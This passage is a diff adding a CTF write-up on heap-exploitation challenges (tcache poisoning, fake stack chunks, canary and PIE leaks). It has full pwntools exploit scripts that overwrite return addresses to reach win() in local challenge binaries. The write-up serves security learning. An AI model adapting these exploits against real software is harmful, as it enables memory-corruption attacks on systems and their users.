+<li><strong>At <strong><code>**CHUNK_A + 8**</code></strong>: It writes the address of the string <strong><code>**&quot;Data:&quot;**</code></strong> (which is on the stack).</strong></li>
+</ul>
+<p>According to the assembly, <code>argv[2]</code> (the second thing <code>/bin/echo</code> will print) is calculated as <code>arg1 + arg2</code>.</p>
+<ul>
+<li>You passed <code>arg1 = allocations[0]</code> (which is the address of <code>CHUNK_A</code>).</li>
+<li>You passed <code>arg2 = 0</code>.</li>
+<li>Therefore, <code>argv[2]</code> points to **the start of **<code>**CHUNK_A**</code>.</li>
+</ul>
+<p> What is at the start of <code>CHUNK_A</code>? </p>
+<p><strong>The memory address of the string <strong><code>**&quot;/bin/echo&quot;**</code></strong> itself.</strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771347064267-d75260fc-0677-489f-aeb3-1f2cacef2b62.png" srcset="/img/loading.gif" lazyload></p>
+<p>0x0000000000001b00  win</p>
+<hr>
+<p>0x1c20 &lt;+35&gt;: mov    DWORD PTR [rbp-0xe],0x61746144  ; “Data”</p>
+<p>0x1c27 &lt;+42&gt;: mov    WORD PTR [rbp-0xa],0x3a        ; “:”</p>
+<p>rbp - 0xe is “Data”&#x3D;v4</p>
+<p>We can get echo funtion’s rbp</p>
+<p>What’s main_ret?</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771349689695-d162dfe4-4a51-4217-ba2b-7e9918d27293.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771349768244-2d203e37-5711-40fc-8ef0-e1c4f63d79af.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771349985737-4684fae5-826d-4616-b6e1-c4c585eb3b88.png" srcset="/img/loading.gif" lazyload></p>
+<p>Get</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [4]: from pwn import *<br>   ...: addr = 0x422a68<br>   ...: def cyc():<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;malloc\n 0\n 30\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;free\n0\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;echo\n 0\n 0\n&#x27;)<br>   ...:     p.recvuntil(b&quot;Data: &quot;)<br>   ...:     base_addr = u64(p.recv(6).ljust(8,b&quot;\x00&quot;)) - 0x33f8<br>   ...:     win_addr = base_addr +0x1b00<br>   ...:     print(hex(win_addr))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;echo\n 0\n 8\n&#x27;)<br>   ...:     p.recvuntil(b&quot;Data: &quot;)<br>   ...:     main_ret_addr = u64(p.recv(6).ljust(8,b&quot;\x00&quot;)) + 0x16e + 0x8<br>   ...:     print(hex(main_ret_addr))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;malloc\n 1\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;malloc\n 2\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;free\n 1\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;free\n 2\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;scanf\n 2\n &#x27;)<br>   ...:     p.sendline(p64(main_ret_addr))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;malloc\n 1\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;malloc\n 2\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;scanf\n 2\n &#x27;)<br>   ...:     p.sendline(p64(win_addr))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;q\n &#x27;)<br>   ...: <br>   ...: p = process(&#x27;/challenge/echo-emanations-easy&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771351066125-c5b8594c-3290-49e2-bf3e-db6f4d4a6e2b.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Echo-Emanations-Hard"><a href="#Echo-Emanations-Hard" class="headerlink" title="Echo Emanations (Hard)"></a><font style="color:#2F8EF4;">Echo Emanations (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771353732314-7bc460ce-1873-4493-b122-8cf4cf8ece91.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771353881491-9d028d54-94b6-4088-98ea-7a74c8107348.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771353909616-641796c5-6bf4-4cbb-a538-0805bb4c1473.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771354006529-138ac471-c356-414f-b190-55f437f2effe.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Stack-Spoofing-Easy"><a href="#Stack-Spoofing-Easy" class="headerlink" title="Stack Spoofing (Easy)"></a><font style="color:#2F8EF4;">Stack Spoofing (Easy)</font></h5><p>The stack_free:</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771422460018-c81e2b37-2052-4c7d-afe4-be73e74e60f6.png" srcset="/img/loading.gif" lazyload></p>
+<p>It calculates <code>(rbp - 0x90) + 0x40</code>, which is <code>**rbp - 0x50**</code>.  </p>
+<p>It then calls <code>**free()**</code>** on that stack address**. Under normal circumstances, this would crash the program. You must set up a “fake chunk” metadata header for this to succeed.  </p>
+<p>The stack_scanf:</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771422743893-83a9fb6a-d5f5-4802-a38d-2c1b8751dd3e.png" srcset="/img/loading.gif" lazyload></p>
+<p>It write data to rbp - 0x90</p>
+<p>The <code>stack_free</code> target is at <code>rbp - 0x50</code>,  you can use this command to write the “Fake Size” (<code>0x81</code>) at the correct offset to satisfy the heap allocator’s checks.  </p>
+<p>The stack_malloc_win:</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771429138503-9631b621-887c-41de-8466-61caebd6629a.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>This is the final test. It requests a <code>0x70</code> byte chunk.</li>
+<li>If your “Stack Spoofing” worked, the Tcache will return the stack address <code>**rbp - 0x50**</code>.</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [1]: from pwn import *<br>   ...: offset = 0x90-0x58<br>   ...: def cyc():<br>   ...:     #p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;malloc\n 0\n 30\n&#x27;)<br>   ...:     p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): &quot;, b&quot;stack_scanf&quot;)<br>   ...: <br>   ...:     p.sendline(b&quot;k&quot;*offset +p64(0x41))<br>   ...:     p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): &quot;, b&quot;stack_free&quot;)<br>   ...:     p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): &quot;, b&quot;stack_malloc_win&quot;)<br>   ...:     #p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): &quot;, b&quot;q&quot;)<br>   ...: p = process(&#x27;/challenge/stack-spoofing-hard&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771429679767-3512a775-c5fb-46b2-a787-23f73cc6c00a.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Stack-Spoofing-Hard"><a href="#Stack-Spoofing-Hard" class="headerlink" title="Stack Spoofing (Hard)"></a><font style="color:#2F8EF4;">Stack Spoofing (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771430189787-d7982ab5-8131-4be5-be7c-0acbf66e7ef2.png" srcset="/img/loading.gif" lazyload></p>
+<p>malloc 0x35</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771430378683-ac0e1619-2490-41bf-b35a-573bc651e803.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Stack-Summoning-Easy"><a href="#Stack-Summoning-Easy" class="headerlink" title="Stack Summoning (Easy)"></a><font style="color:#2F8EF4;">Stack Summoning (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771512884812-7b6f86ef-7e48-498e-a304-bfe7135f2fc7.png" srcset="/img/loading.gif" lazyload></p>
+<p>Leak secret ?</p>
+<p>We can overwrite secret or puts it</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771516404354-92bb7ac8-6c9a-47bc-a16b-9be09e5f7719.png" srcset="/img/loading.gif" lazyload></p>
+<p>Make secret and stored to rbp - 0xad</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771516641907-2ffadfd0-04eb-489f-b702-3364819dc4c5.png" srcset="/img/loading.gif" lazyload></p>
+<p>stack_scanf funtion, scanf at rbp - 0x150</p>
+<p>We can utilize it to make fake chunk</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771516842440-2b115f15-f6bd-4305-b3aa-78685abf312c.png" srcset="/img/loading.gif" lazyload></p>
+<p>The stack_free will free rbp - 0x110</p>
+<p>Free, malloc and scanf</p>
+<p>Then, puts or overwrite the secret</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771517057899-5808e5c0-b120-4d6d-b382-ca3c55acc94e.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [7]: from pwn import *<br>   ...: offset = 0x150 - (0x110 +0x8)<br>   ...: def cyc():<br>   ...:     #p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;malloc\n 0\n 30\n&#x27;)<br>   ...:     p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;, b&quot;stack_scanf&quot;)<br>   ...: <br>   ...:     p.sendline(b&quot;k&quot;*offset +p64(0x91))<br>   ...:     p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;, b&quot;stack_free&quot;)<br>   ...:     p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;, b&quot;malloc \n 0 \n128\n&quot;)<br>   ...:     p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;, b&quot;scanf \n 0&quot;)<br>   ...:     p.sendline(b&quot;k&quot;*(0x63+0x10))<br>   ...:     p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;, b&quot;send_flag\n&quot;)<br>   ...:     p.sendline(b&#x27;k&#x27;*0x10)<br>   ...:     #p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): &quot;, b&quot;q&quot;)<br>   ...: p = process(&#x27;/challenge/stack-summoning-easy&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771517993216-303389cd-226c-4bcd-ad7c-aaefa58b111c.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Stack-Summoning-Hard"><a href="#Stack-Summoning-Hard" class="headerlink" title="Stack Summoning (Hard)"></a><font style="color:#2F8EF4;">Stack Summoning (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771518143120-b852bda3-d8d8-49fd-be71-dbbe574c8d06.png" srcset="/img/loading.gif" lazyload></p>
+<p>Secret is at rbp - 0xa6</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771520253380-f020c11d-ecc2-415c-ac6d-6b388e89afd9.png" srcset="/img/loading.gif" lazyload></p>
+<p>Free rbp - 0x1a0 + 0x40 &#x3D; rbp - 0x160</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771520347796-9c1aabee-faa7-4fbd-a71f-716fabce83d8.png" srcset="/img/loading.gif" lazyload></p>
+<p>Stack_scanf at rbp - 0x1a0</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771520722570-9ae1cf9c-23fb-4de4-a9e8-a10941faf819.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Enterprising-Echo-Easy"><a href="#Enterprising-Echo-Easy" class="headerlink" title="Enterprising Echo (Easy)"></a><font style="color:#2F8EF4;">Enterprising Echo (Easy)</font></h5><p>The echo function come back</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771522404213-8fe3e304-55b9-470d-af3a-f6753ad0ec99.png" srcset="/img/loading.gif" lazyload></p>
+<p>Malloc 0x20 at start</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771523606537-38325a9c-9408-45ef-9622-787e2085f973.png" srcset="/img/loading.gif" lazyload></p>
+<p>argv array</p>
+<p>Same as the echo emanations</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771572562365-c2c624e6-866d-44b6-9298-a176ab51dc26.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771572576725-7d128754-cb37-4459-ac3f-584991e58492.png" srcset="/img/loading.gif" lazyload></p>
+<p>We can utilize echo funtion to leak canary</p>
+<p>Canary is at rbp - 0x8</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771573494154-005b5cc8-7d0b-44a7-b4fd-5b3e9f57fc2b.png" srcset="/img/loading.gif" lazyload></p>
+<p>If b’\x00’ in canary , we can’t recv(7),try again</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [8]: from pwn import *<br>   ...: offset = 0x90-0x58<br>   ...: offset1 =  b&#x27;73&#x27;      #0x50 - 0x8 +0x1<br>   ...: def cyc():<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):&#x27;,b&#x27;malloc\n 0\n 30\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):&#x27;,b&#x27;free\n0\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):&#x27;,b&#x27;echo\n 0\n 0\n&#x27;)<br>   ...:     p.recvuntil(b&quot;Data: &quot;)<br>   ...:     base_addr = u64(p.recv(6).ljust(8,b&quot;\x00&quot;)) - 0x33f8<br>   ...:     win_addr = base_addr +0x1a22<br>   ...:     print(hex(win_addr))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):&#x27;,b&#x27;stack_scanf\n &#x27;)<br>   ...:     p.sendline(b&#x27;k&#x27;*offset +p64(0x21))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):&#x27;,b&#x27;stack_free\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):&#x27;,b&#x27;malloc\n0\n17\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):&#x27;,b&#x27;echo\n 0\n 73\n&#x27;)<br>   ...:     #pause()<br>   ...:     #p.sendline(offset1)<br>   ...:     out=p.recvuntil(b&quot;Data: &quot;)<br>   ...:     canary_body = p.recv(7)<br>   ...:     canary = b&#x27;\x00&#x27; + canary_body<br>   ...:     print(hex(u64(canary)))<br>   ...:     print(out.decode())<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):&#x27;,b&#x27;stack_scanf\n &#x27;)<br>   ...:     p.sendline(b&#x27;k&#x27;*offset +p64(0x91))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):&#x27;,b&#x27;stack_free\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):&#x27;,b&#x27;malloc\n0\n128\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):&#x27;,b&#x27;scanf\n0\n&#x27;)<br>   ...:     p.sendline(b&#x27;k&#x27;*0x48 +canary +p64(0xdeadbeef) + p64(win_addr))<br>   ...: <br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit):&#x27;,b&#x27;q\n &#x27;)<br>   ...: <br>   ...: p = process(&#x27;/challenge/enterprising-echo-easy&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771581175591-c49aa824-46b9-4774-8a81-6dc903ba90c5.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Enterprising-Echo-Hard"><a href="#Enterprising-Echo-Hard" class="headerlink" title="Enterprising Echo (Hard)"></a><font style="color:#2F8EF4;">Enterprising Echo (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771583092174-3f1feab6-36a5-4be5-9363-9bacd8c48927.png" srcset="/img/loading.gif" lazyload></p>
+<p>There is b’\09’ in win_addr</p>
+<p>We can use 0x141d</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771583169920-b1e42e47-73cc-40f5-9a1a-621ee8845da1.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Ephemeral-Echo-Easy"><a href="#Ephemeral-Echo-Easy" class="headerlink" title="Ephemeral Echo (Easy)"></a><font style="color:#2F8EF4;">Ephemeral Echo (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771583307802-84a526f3-5f90-46a8-ade3-aedc4f49debb.png" srcset="/img/loading.gif" lazyload></p>
+<p>Ok, we haven’t stack_ funtions</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771593750750-3bb1e7ec-95d0-4a3b-b55a-ce9bc7f739a4.png" srcset="/img/loading.gif" lazyload></p>
+<p>The free will make the allocations[0] &#x3D; 0</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771593901452-e3276ed5-45b3-4da5-9562-1978b85d97fd.png" srcset="/img/loading.gif" lazyload></p>
+<p>Fault to leak</p>
+<p>Another way :</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771596066191-20c868a5-a51b-4ef1-b8a9-63032a0ee8cf.png" srcset="/img/loading.gif" lazyload></p>
+<p>The chunk is side by side, so we can malloc and then echo to leak (<font style="color:#DF2A3F;">the head of chunk is 16bytes</font>)</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771727137521-d4531d57-a7d3-4591-9dee-21b428a81526.png" srcset="/img/loading.gif" lazyload></p>
+<p>The argv[0] is at 0x33f8</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771727203486-516df83c-e12d-4a4e-ac92-b4971c1f0914.png" srcset="/img/loading.gif" lazyload></p>
+<p>The argv[1] is at echo’s rbp - 0xe</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771727385621-746f4f61-85bc-4509-b82f-a72ca37cdb9d.png" srcset="/img/loading.gif" lazyload></p>
+<p>Good</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771727489034-2a8181c9-9c20-43db-bf22-7d58d1a437de.png" srcset="/img/loading.gif" lazyload></p>
+<p>The offset_win is 0x1b00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [3]: from pwn import *<br>   ...: addr = 0x422a68<br>   ...: def cyc():<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;malloc\n 0\n 30\n&#x27;)<br>   ...:     #p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;free\n0\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;echo\n 0\n 48\n&#x27;)<br>   ...:     p.recvuntil(b&quot;Data: &quot;)<br>   ...:     base_addr = u64(p.recv(6).ljust(8,b&quot;\x00&quot;)) - 0x33f8<br>   ...:     win_addr = base_addr +0x1b00<br>   ...:     print(hex(win_addr))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;echo\n 0\n 56\n&#x27;)<br>   ...:     p.recvuntil(b&quot;Data: &quot;)<br>   ...:     main_ret_addr = u64(p.recv(6).ljust(8,b&quot;\x00&quot;)) + 0x16e + 0x8<br>   ...:     print(hex(main_ret_addr))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;malloc\n 0\n 32\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;malloc\n 1\n 32\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;malloc\n 2\n 32\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;free\n 2\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;free\n 1\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;read\n 0\n 60\n&#x27;)<br>   ...:     p.sendline(b&#x27;k&#x27;*0x20+p64(0x0)+p64(0x21)+p64(main_ret_addr))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;malloc\n 1\n 32\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;malloc\n 2\n 32\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;read\n 2\n 8\n&#x27;)<br>   ...:     p.sendline(p64(win_addr))<br>   ...:     #p.sendafter(b&#x27;[*] Function (malloc/free/echo/read/quit):&#x27;,b&#x27;q\n &#x27;)<br>   ...: <br>   ...: p = process(&#x27;/challenge/ephemeral-echo-easy&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771737626276-fd39f724-2459-47c2-b1eb-417946a94e44.png" srcset="/img/loading.gif" lazyload></p>
